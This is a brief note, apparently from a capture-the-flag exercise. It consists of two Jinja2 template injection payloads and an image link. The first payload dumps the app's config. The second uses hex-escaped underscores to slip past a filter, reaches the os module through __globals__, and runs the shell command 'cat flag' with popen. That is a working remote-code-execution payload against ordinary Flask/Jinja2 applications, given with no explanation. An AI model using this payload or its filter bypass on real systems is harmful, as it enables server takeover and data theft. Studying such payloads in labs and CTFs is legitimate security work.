```java
{{config}}
```

```java
{{ config | attr('\x5f\x5fclass\x5f\x5f') | attr('\x5f\x5finit\x5f\x5f') | attr('\x5f\x5fglobals\x5f\x5f') | attr('\x5f\x5fgetitem\x5f\x5f')('os') | attr('popen')('cat flag') | attr('read')() }}
```

![[Pasted image 20260915192251.png]]

